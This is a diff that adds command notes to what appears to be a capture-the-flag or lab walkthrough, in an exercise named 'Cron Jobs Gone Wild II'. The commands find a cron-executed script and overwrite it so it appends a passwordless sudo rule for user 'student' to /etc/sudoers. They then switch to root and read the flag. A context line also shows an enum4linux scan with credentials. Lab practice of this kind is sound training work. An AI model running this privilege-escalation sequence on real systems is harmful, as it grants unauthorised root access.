@@ -727,6 +727,19 @@ enum4linux -r -u "admin" -p "password1" 192.212.251.3
 39) Cron Jobs Gone Wild II
 
 ```
+ls -l
+find / -name message
+ls -l /tmp/
+grep -nri “/tmp/message” /usr
+ls -l /usr/local/share/copy.sh
+cat /usr/local/share/copy.sh
+ printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+sudo -l
+sudo -l
+sudo su
+cd /root
+ls -l
+cat flag
 
 ```
 
